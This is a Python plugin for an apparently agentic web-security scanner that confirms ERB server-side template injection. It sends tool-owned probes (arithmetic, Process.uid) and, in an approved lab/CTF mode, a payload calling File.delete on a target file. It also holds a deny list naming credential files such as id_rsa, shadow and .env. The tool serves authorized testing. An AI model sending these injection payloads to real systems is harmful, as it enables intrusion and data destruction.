"""Fail-closed ERB server-side template injection confirmation.

The initial mode deliberately owns every payload.  It can either prove ERB
runtime evaluation with four read-only, same-origin GET requests or wrap that
proof in one explicitly approved lab/CTF file-deletion effect and a
fresh-unsolved-to-solved transition.  Callers cannot provide templates,
commands, headers, cookies, request bodies, proxies, or alternate origins.
"""

from __future__ import annotations

import hashlib
import re
import secrets
from html import unescape
from typing import Any, Dict, Iterable, Optional, Tuple
from urllib.parse import unquote_plus, urlencode, urljoin, urlsplit, urlunsplit

import aiohttp

from plugin_interface import ToolPlugin
from tools._agentic_exploration_common import read_limited
from tools.web_authentication_probe import (
    REDACTED_RUNTIME_SECRET,
    _field_name,
    _http_target,
    _path_and_query,
    sanitize_evidence_text,
)


ALLOWED_MODES = {"erb-query-v1"}
ALLOWED_PROOF_LEVELS = {"runtime-evaluation", "lab-state-change"}
ALLOWED_ENGAGEMENTS = {"aggressive", "lab", "ctf"}
STATE_CHANGE_ENGAGEMENTS = {"lab", "ctf"}
EXPECTED_RUNTIME_STEP_LABELS = (
    "literal-control",
    "erb-arithmetic-primary",
    "erb-arithmetic-fingerprint",
    "erb-runtime-uid",
)
EXPECTED_LAB_STEP_LABELS = (
    "unsolved-baseline",
    *EXPECTED_RUNTIME_STEP_LABELS,
    "approved-file-delete",
    "solved-confirmation",
)
MAX_RESPONSE_BYTES = 64_000
MAX_EVIDENCE_CHARS = 65_000
MAX_MARKER_CHARS = 512
MAX_PATH_CHARS = 2_048

_SENSITIVE_PARAMETER = re.compile(
    r"(?:auth|csrf|token|session|cookie|pass(?:word|wd)?|secret|api[_-]?key)",
    re.I,
)
_NONCE = re.compile(r"^[0-9a-f]{32}$")
_COMPACT_TOKEN = re.compile(
    r"(?<![A-Za-z0-9_-])[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\."
    r"[A-Za-z0-9_-]{8,}(?![A-Za-z0-9_-])"
)
_PEM_BLOCK = re.compile(
    r"-----BEGIN [A-Z0-9 ]{1,64}-----.*?-----END [A-Z0-9 ]{1,64}-----",
    re.S,
)
_UNSAFE_EFFECT_CHAR = re.compile(r"[\s\x00-\x1f\x7f*?\[\]\"'\\]")
_EFFECT_PATH = re.compile(r"^/[A-Za-z0-9._/-]+$")
_CONFIG_LIKE_NAME = re.compile(
    r"(?:^|[._-])(?:config|configuration|credentials?|secrets?)(?:$|[._-])",
    re.I,
)
_DENIED_EFFECT_SEGMENTS = {
    ".ssh",
    "authorized_keys",
    "id_rsa",
    "id_dsa",
    "id_ecdsa",
    "id_ed25519",
    "passwd",
    "shadow",
    "gshadow",
    ".env",
    "hosts",
    "resolv.conf",
}
_ALLOWED_PARAMETERS = {
    "target",
    "url",
    "mode",
    "proofLevel",
    "endpointPath",
    "injectionParameter",
    "expectedProbeStatus",
    "statusPath",
    "unsolvedMarker",
    "solvedMarker",
    "expectedStatusStatus",
    "effectTargetPath",
    "expectedEffectStatus",
    "engagement",
    "allowUnsafeMethods",
    "stateChangeApproved",
    "timeoutSeconds",
    "_agent",
    "_job_id",
    "_job_timeout_seconds",
}
_STATE_CHANGE_PARAMETERS = {
    "statusPath",
    "unsolvedMarker",
    "solvedMarker",
    "expectedStatusStatus",
    "effectTargetPath",
    "expectedEffectStatus",
    "stateChangeApproved",
}


def _sha256_text(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8")).hexdigest()


def _safe_error_text(exc: Exception) -> str:
    try:
        text = str(exc)
    except Exception:
        text = exc.__class__.__name__
    return (text or exc.__class__.__name__)[:500]


def _safe_relative_path(value: Any) -> Optional[str]:
    """Return a same-origin absolute path with no query, fragment, or dot segment."""

    if not isinstance(value, str):
        return None
    raw = value.strip()
    if (
        not raw
        or len(raw) > MAX_PATH_CHARS
        or not raw.startswith("/")
        or raw.startswith("//")
        or "//" in raw
        or raw != value
        or any(ch in raw for ch in "\r\n\0\\%")
    ):
        return None
    try:
        parsed = urlsplit(raw)
    except Exception:
        return None
    if parsed.scheme or parsed.netloc or parsed.query or parsed.fragment:
        return None
    segments = raw.split("/")
    if any(segment in {".", ".."} for segment in segments):
        return None
    return raw


def validate_effect_target_path(value: Any) -> Optional[str]:
    """Validate the one disposable file path accepted by the lab-only mode."""

    if not isinstance(value, str):
        return None
    raw = value
    if (
        not raw
        or len(raw) > MAX_PATH_CHARS
        or raw != raw.strip()
        or not raw.startswith("/")
        or raw.startswith("//")
        or "//" in raw
        or ".." in raw
        or _UNSAFE_EFFECT_CHAR.search(raw)
        or _EFFECT_PATH.fullmatch(raw) is None
    ):
        return None
    segments = raw.split("/")[1:]
    if not segments or any(not segment or segment in {".", ".."} for segment in segments):
        return None
    if not any(raw.startswith(prefix) for prefix in ("/home/", "/tmp/", "/var/tmp/")):
        return None
    lowered = [segment.lower() for segment in segments]
    if any(
        segment == denied
        or segment.startswith(f"{denied}.")
        or segment.endswith(f".{denied}")
        for segment in lowered
        for denied in _DENIED_EFFECT_SEGMENTS
    ):
        return None
    if any(_CONFIG_LIKE_NAME.search(segment) for segment in lowered):
        return None
    if any(
        segment.endswith((".conf", ".cfg", ".ini", ".pem", ".key"))
        for segment in lowered
    ):
        return None
    return raw


def _bounded_marker(value: Any) -> Optional[str]:
    if not isinstance(value, str):
        return None
    if (
        len(value) < 3
        or len(value) > MAX_MARKER_CHARS
        or value != value.strip()
        or any(ch in value for ch in "\r\n\0")
    ):
        return None
    return value


def _bounded_status(parameters: Dict[str, Any], name: str) -> Optional[int]:
    try:
        value = int(parameters[name])
    except (KeyError, TypeError, ValueError):
        return None
    return value if 200 <= value <= 599 else None


def validate_probe_parameters(parameters: Dict[str, Any]) -> Tuple[bool, str]:
    # PluginLoader and the agent runtime inject only these private execution
    # handles after JSON-schema validation. They are never caller-visible and
    # every other unknown key is rejected by this closed contract.
    unknown = sorted(
        str(key)
        for key in parameters
        if key not in _ALLOWED_PARAMETERS
    )
    if unknown:
        return False, f"unsupported parameter: {unknown[0]}"

    has_target = isinstance(parameters.get("target"), str) and bool(parameters["target"])
    has_url = isinstance(parameters.get("url"), str) and bool(parameters["url"])
    if has_target == has_url:
        return False, "exactly one of target or url is required"
    target = _http_target(parameters.get("target") or parameters.get("url"))
    if not target:
        return False, (
            "target must be a credential-free HTTP(S) base URL without query or fragment"
        )
    if str(parameters.get("mode") or "").lower() not in ALLOWED_MODES:
        return False, "mode must be erb-query-v1"

    proof_level = str(parameters.get("proofLevel") or "").lower()
    if proof_level not in ALLOWED_PROOF_LEVELS:
        return False, "proofLevel must be runtime-evaluation or lab-state-change"
    engagement = str(parameters.get("engagement") or "").lower()
    if engagement not in ALLOWED_ENGAGEMENTS:
        return False, "engagement must be aggressive, lab, or ctf"
    if parameters.get("allowUnsafeMethods") is not True:
        return False, "allowUnsafeMethods=true is required"

    if not _safe_relative_path(parameters.get("endpointPath")):
        return False, "endpointPath must be a bounded same-origin path without query or fragment"
    injection_parameter = _field_name(parameters.get("injectionParameter"))
    if not injection_parameter or _SENSITIVE_PARAMETER.search(injection_parameter):
        return False, "injectionParameter must be a valid non-sensitive query-field name"
    if _bounded_status(parameters, "expectedProbeStatus") is None:
        return False, "expectedProbeStatus must be between 200 and 599"

    try:
        timeout = int(parameters.get("timeoutSeconds") or 15)
    except (TypeError, ValueError):
        return False, "timeoutSeconds must be an integer"
    if timeout < 3 or timeout > 30:
        return False, "timeoutSeconds must be between 3 and 30"

    if proof_level == "runtime-evaluation":
        unexpected = sorted(_STATE_CHANGE_PARAMETERS.intersection(parameters))
        if unexpected:
            return False, (
                f"{unexpected[0]} is only allowed for proofLevel=lab-state-change"
            )
        return True, ""

    if engagement not in STATE_CHANGE_ENGAGEMENTS:
        return False, "lab-state-change requires engagement lab or ctf"
    if parameters.get("stateChangeApproved") is not True:
        return False, "stateChangeApproved=true is required for lab-state-change"
    if not _safe_relative_path(parameters.get("statusPath")):
        return False, "statusPath must be a bounded same-origin path without query or fragment"

    unsolved_marker = _bounded_marker(parameters.get("unsolvedMarker"))
    solved_marker = _bounded_marker(parameters.get("solvedMarker"))
    if unsolved_marker is None or solved_marker is None:
        return False, "unsolvedMarker and solvedMarker must be bounded safe strings"
    if unsolved_marker == solved_marker:
        return False, "unsolvedMarker and solvedMarker must be distinct"
    if _bounded_status(parameters, "expectedStatusStatus") is None:
        return False, "expectedStatusStatus must be between 200 and 599"
    if _bounded_status(parameters, "expectedEffectStatus") is None:
        return False, "expectedEffectStatus must be between 200 and 599"
    if validate_effect_target_path(parameters.get("effectTargetPath")) is None:
        return False, "effectTargetPath is not an approved normalized disposable file path"
    return True, ""


def build_probe_payloads(nonce: str, effect_target_path: Optional[str] = None) -> Dict[str, str]:
    if _NONCE.fullmatch(nonce) is None:
        raise ValueError("nonce must be exactly 32 lowercase hexadecimal characters")
    payloads = {
        "literal": f"xasm-ssti-{nonce}-literal",
        "arithmeticPrimary": (
            f'<%= "xasm-ssti-{nonce}-eval-" + (43*59).to_s %>'
        ),
        "arithmeticFingerprint": (
            f'<%= "xasm-ssti-{nonce}-fp-" + (61*67).to_s %>'
        ),
        "runtimeUid": (
            f'<%= "xasm-ssti-{nonce}-uid-" + Process.uid.to_s %>'
        ),
    }
    if effect_target_path is not None:
        safe_path = validate_effect_target_path(effect_target_path)
        if safe_path is None:
            raise ValueError("effect target path is outside the approved disposable contract")
        payloads["effect"] = f'<%= File.delete("{safe_path}") %>'
    return payloads


def _expected_markers(nonce: str) -> Dict[str, str]:
    return {
        "literal": f"xasm-ssti-{nonce}-literal",
        "arithmeticPrimary": f"xasm-ssti-{nonce}-eval-2537",
        "arithmeticFingerprint": f"xasm-ssti-{nonce}-fp-4087",
        "runtimeUidPrefix": f"xasm-ssti-{nonce}-uid-",
    }


def _payload_metadata(
    payloads: Dict[str, str],
    markers: Dict[str, str],
) -> Dict[str, Dict[str, Any]]:
    result: Dict[str, Dict[str, Any]] = {
        "literal": {
            "sha256": _sha256_text(payloads["literal"]),
            "length": len(payloads["literal"].encode("utf-8")),
            "expectedMarker": markers["literal"],
        },
        "arithmeticPrimary": {
            "sha256": _sha256_text(payloads["arithmeticPrimary"]),
            "length": len(payloads["arithmeticPrimary"].encode("utf-8")),
            "expectedMarker": markers["arithmeticPrimary"],
        },
        "arithmeticFingerprint": {
            "sha256": _sha256_text(payloads["arithmeticFingerprint"]),
            "length": len(payloads["arithmeticFingerprint"].encode("utf-8")),
            "expectedMarker": markers["arithmeticFingerprint"],
        },
        "runtimeUid": {
            "sha256": _sha256_text(payloads["runtimeUid"]),
            "length": len(payloads["runtimeUid"].encode("utf-8")),
            "expectedMarkerPrefix": markers["runtimeUidPrefix"],
        },
    }
    if "effect" in payloads:
        result["effect"] = {
            "sha256": _sha256_text(payloads["effect"]),
            "length": len(payloads["effect"].encode("utf-8")),
        }
    return result


def _probe_url(endpoint_url: str, injection_parameter: str, payload: str) -> str:
    parsed = urlsplit(endpoint_url)
    query = urlencode([(injection_parameter, payload)])
    return urlunsplit((parsed.scheme, parsed.netloc, parsed.path or "/", query, ""))


def _sanitize_http_text(text: Any, secrets_to_redact: Iterable[Any] = ()) -> str:
    sanitized = sanitize_evidence_text(
        text,
        secrets_to_redact,
        MAX_EVIDENCE_CHARS,
    )
    sanitized = _COMPACT_TOKEN.sub(REDACTED_RUNTIME_SECRET, sanitized)
    sanitized = _PEM_BLOCK.sub(REDACTED_RUNTIME_SECRET, sanitized)
    return sanitized


def _request_transcript(url: str) -> str:
    parsed = urlsplit(url)
    lines = [
        f"GET {_path_and_query(url)} HTTP/1.1",
        f"Host: {parsed.netloc}",
        "User-Agent: xASM-Agentic-SSTI-Probe/1.0",
        "Accept: text/html,application/xhtml+xml,text/plain",
    ]
    return _sanitize_http_text("\r\n".join(lines) + "\r\n\r\n")


def _response_transcript(response: Dict[str, Any]) -> Tuple[str, bool]:
    reason = str(response.get("reason") or "").replace("\r", "").replace("\n", "")[:100]
    lines = [f"HTTP/1.1 {int(response.get('status') or 0)} {reason}"]
    headers = response.get("headers")
    for name in ("Content-Type", "Content-Length", "Cache-Control", "Location", "Set-Cookie"):
        if headers is None:
            continue
        try:
            values = headers.getall(name, [])
        except AttributeError:
            value = headers.get(name) if hasattr(headers, "get") else None
            values = [] if value is None else [value]
        for value in values:
            lines.append(f"{name}: {value}")
    raw = "\r\n".join(lines) + "\r\n\r\n" + str(response.get("body") or "")
    oversized = len(raw.encode("utf-8", errors="replace")) > MAX_EVIDENCE_CHARS
    return _sanitize_http_text(raw), bool(response.get("truncated")) or oversized


def build_http_evidence_step(
    label: str,
    url: str,
    response: Dict[str, Any],
    carrier_role: str,
    payload: str = "",
) -> Dict[str, Any]:
    request = _request_transcript(url)
    response_text, truncated = _response_transcript(response)
    response_body = (
        response_text.split("\r\n\r\n", 1)[1]
        if "\r\n\r\n" in response_text
        else ""
    )
    return {
        "label": label,
        "carrierRole": carrier_role,
        "payloadSha256": _sha256_text(payload) if carrier_role != "none" else "",
        "request": request,
        "requestSha256": _sha256_text(request),
        "response": response_text,
        "responseSha256": _sha256_text(response_text),
        "responseBodySha256": _sha256_text(response_body),
        "responseStatus": int(response.get("status") or 0),
        "responseBodyLength": len(response_body.encode("utf-8")),
        "responseExcerptTruncated": truncated,
    }


def _body(response: Dict[str, Any]) -> str:
    return unescape(str(response.get("body") or "").replace("\0", ""))


def _contains_raw_payload(body: str, payload: str) -> bool:
    return payload in body or payload in unquote_plus(body)


def _exact_marker_count(body: str, marker: str) -> int:
    return len(re.findall(re.escape(marker) + r"(?![A-Za-z0-9_-])", body))


def _is_redirect(response: Dict[str, Any]) -> bool:
    status = int(response.get("status") or 0)
    return bool(response.get("redirected")) or 300 <= status <= 399


def _response_is_bounded(response: Dict[str, Any]) -> bool:
    response_text, transcript_truncated = _response_transcript(response)
    return (
        not transcript_truncated
        and not _is_redirect(response)
        and len(str(response.get("body") or "").encode("utf-8", errors="replace"))
        <= MAX_RESPONSE_BYTES
        and len(response_text.encode("utf-8")) <= MAX_EVIDENCE_CHARS
    )


def _assert_clean_of_proof_material(
    body: str,
    payloads: Dict[str, str],
    markers: Dict[str, str],
    *,
    allowed_marker: Optional[str] = None,
    allowed_payload: Optional[str] = None,
) -> None:
    for marker in (
        markers["literal"],
        markers["arithmeticPrimary"],
        markers["arithmeticFingerprint"],
    ):
        if marker != allowed_marker and marker in body:
            raise ValueError("response contained a nonce proof marker outside its owning step")
    if markers["runtimeUidPrefix"] != allowed_marker and markers["runtimeUidPrefix"] in body:
        raise ValueError("response contained a runtime proof marker outside its owning step")
    for payload in payloads.values():
        if payload != allowed_payload and _contains_raw_payload(body, payload):
            raise ValueError("response reflected tool-owned payload material in the wrong step")


def build_nuclei_finding(target: str, verification: Dict[str, Any]) -> Dict[str, Any]:
    return {
        "template-id": "xasm-erb-ssti-verified-candidate",
        "matcher-name": "erb-runtime-evaluation",
        "type": "http",
        "host": target,
        "matched-at": urljoin(target, str(verification.get("endpointPath") or "/")),
        "info": {
            "name": "Verified Server-Side Template Injection in ERB",
            "severity": "high",
            "description": (
                "Nonce-bound arithmetic and Process.uid expressions were evaluated by "
                "the server-side ERB template runtime."
            ),
            "remediation": (
                "Never concatenate untrusted input into templates. Treat user-controlled "
                "values only as data, use fixed templates, and isolate the rendering runtime."
            ),
            "classification": {"cwe-id": ["CWE-1336"]},
        },
        "evidence": verification,
    }


class SstiProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:ssti_probe"

    @property
    def description(self) -> str:
        return (
            "Confirms bounded ERB query-context template evaluation with tool-owned "
            "literal, arithmetic, fingerprint, and Process.uid probes; an optional "
            "approved lab/CTF mode performs one validated disposable-file deletion last."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        state_change_fields = sorted(_STATE_CHANGE_PARAMETERS)
        return {
            "type": "object",
            "additionalProperties": False,
            "properties": {
                "target": {"type": "string"},
                "url": {"type": "string"},
                "mode": {"type": "string", "enum": sorted(ALLOWED_MODES)},
                "proofLevel": {
                    "type": "string",
                    "enum": sorted(ALLOWED_PROOF_LEVELS),
                },
                "endpointPath": {"type": "string"},
                "injectionParameter": {"type": "string"},
                "expectedProbeStatus": {
                    "type": "integer",
                    "minimum": 200,
                    "maximum": 599,
                },
                "statusPath": {"type": "string"},
                "unsolvedMarker": {
                    "type": "string",
                    "minLength": 3,
                    "maxLength": MAX_MARKER_CHARS,
                },
                "solvedMarker": {
                    "type": "string",
                    "minLength": 3,
                    "maxLength": MAX_MARKER_CHARS,
                },
                "expectedStatusStatus": {
                    "type": "integer",
                    "minimum": 200,
                    "maximum": 599,
                },
                "effectTargetPath": {"type": "string"},
                "expectedEffectStatus": {
                    "type": "integer",
                    "minimum": 200,
                    "maximum": 599,
                },
                "engagement": {
                    "type": "string",
                    "enum": sorted(ALLOWED_ENGAGEMENTS),
                },
                "allowUnsafeMethods": {"type": "boolean", "default": False},
                "stateChangeApproved": {"type": "boolean", "default": False},
                "timeoutSeconds": {"type": "integer", "minimum": 3, "maximum": 30},
            },
            "required": [
                "mode",
                "proofLevel",
                "endpointPath",
                "injectionParameter",
                "expectedProbeStatus",
                "engagement",
                "allowUnsafeMethods",
            ],
            "oneOf": [{"required": ["target"]}, {"required": ["url"]}],
            "allOf": [
                {
                    "if": {
                        "properties": {
                            "proofLevel": {"const": "lab-state-change"},
                        }
                    },
                    "then": {"required": state_change_fields},
                    "else": {
                        "not": {
                            "anyOf": [
                                {"required": [field]} for field in state_change_fields
                            ]
                        }
                    },
                }
            ],
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "exploit-test",
            "phase": 4,
            "domain": ["web"],
            "input_type": ["url", "query", "workflow"],
            "output_type": ["findings", "ssti_proof"],
            "taxonomy_domain": ["web"],
            "lifecycle_phase": "exploit-test",
            "purpose_count": "single",
            "primary_purpose": "Confirm bounded ERB server-side template evaluation",
            "secondary_purposes": [],
        }

    async def _request(
        self,
        session: aiohttp.ClientSession,
        url: str,
    ) -> Dict[str, Any]:
        headers = {
            "User-Agent": "xASM-Agentic-SSTI-Probe/1.0",
            "Accept": "text/html,application/xhtml+xml,text/plain",
        }
        async with session.get(
            url,
            headers=headers,
            allow_redirects=False,
            ssl=True,
        ) as response:
            raw = await read_limited(response.content, MAX_RESPONSE_BYTES + 1)
            truncated = len(raw) > MAX_RESPONSE_BYTES
            raw = raw[:MAX_RESPONSE_BYTES]
            return {
                "status": response.status,
                "reason": str(response.reason or "")[:100],
                "headers": response.headers,
                "body": raw.decode("utf-8", errors="replace").replace("\0", ""),
                "truncated": truncated,
                "redirected": bool(response.history),
            }

    @staticmethod
    def _check_common_response(
        response: Dict[str, Any],
        expected_status: int,
        label: str,
    ) -> str:
        if not _response_is_bounded(response):
            raise ValueError(f"{label} was redirected, truncated, or exceeded evidence bounds")
        if int(response.get("status") or 0) != expected_status:
            raise ValueError(f"{label} returned an unexpected status")
        return _body(response)

    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        valid, reason = validate_probe_parameters(parameters)
        if not valid:
            return {"success": False, "fallback": False, "error": reason, "findings": []}

        target = _http_target(parameters.get("target") or parameters.get("url"))
        assert target is not None
        mode = str(parameters["mode"]).lower()
        proof_level = str(parameters["proofLevel"]).lower()
        engagement = str(parameters["engagement"]).lower()
        endpoint_path = str(parameters["endpointPath"])
        endpoint_url = urljoin(target, endpoint_path)
        injection_parameter = str(parameters["injectionParameter"])
        expected_probe_status = int(parameters["expectedProbeStatus"])
        timeout = int(parameters.get("timeoutSeconds") or 15)
        effect_target_path = (
            str(parameters["effectTargetPath"])
            if proof_level == "lab-state-change"
            else None
        )

        nonce = secrets.token_hex(16)
        payloads = build_probe_payloads(nonce, effect_target_path)
        markers = _expected_markers(nonce)
        payload_metadata = _payload_metadata(payloads, markers)

        request_count = 0
        baseline_requests = 0
        control_requests = 0
        evaluation_requests = 0
        effect_requests = 0
        solved_checks = 0
        evidence_steps = []

        status_path: Optional[str] = None
        status_url: Optional[str] = None
        unsolved_marker: Optional[str] = None
        solved_marker: Optional[str] = None
        expected_status_status: Optional[int] = None
        expected_effect_status: Optional[int] = None
        if proof_level == "lab-state-change":
            status_path = str(parameters["statusPath"])
            status_url = urljoin(target, status_path)
            unsolved_marker = str(parameters["unsolvedMarker"])
            solved_marker = str(parameters["solvedMarker"])
            expected_status_status = int(parameters["expectedStatusStatus"])
            expected_effect_status = int(parameters["expectedEffectStatus"])

        timeout_config = aiohttp.ClientTimeout(total=timeout, connect=min(timeout, 8))
        try:
            async with aiohttp.ClientSession(
                timeout=timeout_config,
                cookie_jar=aiohttp.DummyCookieJar(),
            ) as session:
                if proof_level == "lab-state-change":
                    assert status_url is not None
                    assert unsolved_marker is not None
                    assert solved_marker is not None
                    assert expected_status_status is not None
                    baseline = await self._request(session, status_url)
                    request_count += 1
                    baseline_requests += 1
                    baseline_body = self._check_common_response(
                        baseline,
                        expected_status_status,
                        "unsolved baseline",
                    )
                    if (
                        unsolved_marker not in baseline_body
                        or solved_marker in baseline_body
                    ):
                        raise ValueError(
                            "unsolved baseline did not prove a fresh unsolved state"
                        )
                    _assert_clean_of_proof_material(baseline_body, payloads, markers)
                    evidence_steps.append(
                        build_http_evidence_step(
                            EXPECTED_LAB_STEP_LABELS[0],
                            status_url,
                            baseline,
                            "none",
                        )
                    )

                literal_url = _probe_url(
                    endpoint_url,
                    injection_parameter,
                    payloads["literal"],
                )
                literal = await self._request(session, literal_url)
                request_count += 1
                control_requests += 1
                literal_body = self._check_common_response(
                    literal,
                    expected_probe_status,
                    "literal control",
                )
                if _exact_marker_count(literal_body, markers["literal"]) != 1:
                    raise ValueError(
                        "literal control marker was missing or ambiguous"
                    )
                _assert_clean_of_proof_material(
                    literal_body,
                    payloads,
                    markers,
                    allowed_marker=markers["literal"],
                    allowed_payload=payloads["literal"],
                )
                evidence_steps.append(
                    build_http_evidence_step(
                        EXPECTED_RUNTIME_STEP_LABELS[0],
                        literal_url,
                        literal,
                        "literal-control",
                        payloads["literal"],
                    )
                )

                primary_url = _probe_url(
                    endpoint_url,
                    injection_parameter,
                    payloads["arithmeticPrimary"],
                )
                primary = await self._request(session, primary_url)
                request_count += 1
                evaluation_requests += 1
                primary_body = self._check_common_response(
                    primary,
                    expected_probe_status,
                    "ERB arithmetic primary",
                )
                if (
                    _exact_marker_count(primary_body, markers["arithmeticPrimary"]) != 1
                    or _contains_raw_payload(
                        primary_body,
                        payloads["arithmeticPrimary"],
                    )
                ):
                    raise ValueError(
                        "ERB arithmetic primary marker was missing, ambiguous, or reflected raw"
                    )
                _assert_clean_of_proof_material(
                    primary_body,
                    payloads,
                    markers,
                    allowed_marker=markers["arithmeticPrimary"],
                    allowed_payload=payloads["arithmeticPrimary"],
                )
                evidence_steps.append(
                    build_http_evidence_step(
                        EXPECTED_RUNTIME_STEP_LABELS[1],
                        primary_url,
                        primary,
                        "arithmetic-primary",
                        payloads["arithmeticPrimary"],
                    )
                )

                fingerprint_url = _probe_url(
                    endpoint_url,
                    injection_parameter,
                    payloads["arithmeticFingerprint"],
                )
                fingerprint = await self._request(session, fingerprint_url)
                request_count += 1
                evaluation_requests += 1
                fingerprint_body = self._check_common_response(
                    fingerprint,
                    expected_probe_status,
                    "ERB arithmetic fingerprint",
                )
                if (
                    _exact_marker_count(
                        fingerprint_body,
                        markers["arithmeticFingerprint"],
                    )
                    != 1
                    or _contains_raw_payload(
                        fingerprint_body,
                        payloads["arithmeticFingerprint"],
                    )
                ):
                    raise ValueError(
                        "ERB arithmetic fingerprint marker was missing, ambiguous, or reflected raw"
                    )
                _assert_clean_of_proof_material(
                    fingerprint_body,
                    payloads,
                    markers,
                    allowed_marker=markers["arithmeticFingerprint"],
                    allowed_payload=payloads["arithmeticFingerprint"],
                )
                evidence_steps.append(
                    build_http_evidence_step(
                        EXPECTED_RUNTIME_STEP_LABELS[2],
                        fingerprint_url,
                        fingerprint,
                        "arithmetic-fingerprint",
                        payloads["arithmeticFingerprint"],
                    )
                )

                runtime_url = _probe_url(
                    endpoint_url,
                    injection_parameter,
                    payloads["runtimeUid"],
                )
                runtime = await self._request(session, runtime_url)
                request_count += 1
                evaluation_requests += 1
                runtime_body = self._check_common_response(
                    runtime,
                    expected_probe_status,
                    "ERB runtime uid",
                )
                runtime_matches = re.findall(
                    re.escape(markers["runtimeUidPrefix"])
                    + r"([0-9]{1,20})(?![A-Za-z0-9_])",
                    runtime_body,
                )
                if (
                    len(runtime_matches) != 1
                    or runtime_body.count(markers["runtimeUidPrefix"]) != 1
                    or _contains_raw_payload(runtime_body, payloads["runtimeUid"])
                ):
                    raise ValueError(
                        "ERB runtime uid marker was missing, ambiguous, or reflected raw"
                    )
                _assert_clean_of_proof_material(
                    runtime_body,
                    payloads,
                    markers,
                    allowed_marker=markers["runtimeUidPrefix"],
                    allowed_payload=payloads["runtimeUid"],
                )
                evidence_steps.append(
                    build_http_evidence_step(
                        EXPECTED_RUNTIME_STEP_LABELS[3],
                        runtime_url,
                        runtime,
                        "runtime-uid",
                        payloads["runtimeUid"],
                    )
                )

                if proof_level == "lab-state-change":
                    assert status_url is not None
                    assert unsolved_marker is not None
                    assert solved_marker is not None
                    assert expected_status_status is not None
                    assert expected_effect_status is not None
                    effect_url = _probe_url(
                        endpoint_url,
                        injection_parameter,
                        payloads["effect"],
                    )
                    effect = await self._request(session, effect_url)
                    request_count += 1
                    effect_requests += 1
                    effect_body = self._check_common_response(
                        effect,
                        expected_effect_status,
                        "approved file deletion",
                    )
                    if _contains_raw_payload(effect_body, payloads["effect"]):
                        raise ValueError("approved file deletion payload was reflected raw")
                    _assert_clean_of_proof_material(effect_body, payloads, markers)
                    evidence_steps.append(
                        build_http_evidence_step(
                            EXPECTED_LAB_STEP_LABELS[5],
                            effect_url,
                            effect,
                            "approved-effect",
                            payloads["effect"],
                        )
                    )

                    confirmation = await self._request(session, status_url)
                    request_count += 1
                    solved_checks += 1
                    confirmation_body = self._check_common_response(
                        confirmation,
                        expected_status_status,
                        "solved confirmation",
                    )
                    if (
                        solved_marker not in confirmation_body
                        or unsolved_marker in confirmation_body
                    ):
                        raise ValueError(
                            "approved effect did not produce the configured solved state"
                        )
                    _assert_clean_of_proof_material(
                        confirmation_body,
                        payloads,
                        markers,
                    )
                    evidence_steps.append(
                        build_http_evidence_step(
                            EXPECTED_LAB_STEP_LABELS[6],
                            status_url,
                            confirmation,
                            "none",
                        )
                    )
        except Exception as exc:
            return {
                "success": False,
                "fallback": False,
                "error": _safe_error_text(exc),
                "requestCount": request_count,
                "baselineRequests": baseline_requests,
                "controlRequests": control_requests,
                "evaluationRequests": evaluation_requests,
                "effectRequests": effect_requests,
                "solvedChecks": solved_checks,
                "findings": [],
            }

        verification: Dict[str, Any] = {
            "verified": True,
            "fallback": False,
            "mode": mode,
            "proofLevel": proof_level,
            "target": target,
            "engagement": engagement,
            "allowUnsafeMethods": True,
            "stateChangeApproved": proof_level == "lab-state-change",
            "endpointPath": endpoint_path,
            "injectionParameter": injection_parameter,
            "expectedProbeStatus": expected_probe_status,
            "nonce": nonce,
            "requestCount": request_count,
            "baselineRequests": baseline_requests,
            "controlRequests": control_requests,
            "evaluationRequests": evaluation_requests,
            "effectRequests": effect_requests,
            "solvedChecks": solved_checks,
            "redirectsFollowed": False,
            "literalControlReflected": True,
            "literalControlClean": True,
            "arithmeticPrimaryEvaluated": True,
            "erbFingerprintConfirmed": True,
            "arithmeticFingerprintEvaluated": True,
            "runtimeUidEvaluated": True,
            "payloads": payload_metadata,
            "httpEvidence": {"version": 1, "steps": evidence_steps},
        }
        if proof_level == "lab-state-change":
            verification.update(
                {
                    "statusPath": status_path,
                    "unsolvedMarker": unsolved_marker,
                    "solvedMarker": solved_marker,
                    "expectedStatusStatus": expected_status_status,
                    "effectTargetPath": effect_target_path,
                    "expectedEffectStatus": expected_effect_status,
                    "solvedBefore": False,
                    "effectTriggered": True,
                    "solvedAfter": True,
                }
            )
        finding = build_nuclei_finding(target, verification)
        return {
            "success": True,
            "fallback": False,
            "target": target,
            "requestCount": request_count,
            "verification": verification,
            "findings": [finding],
        }
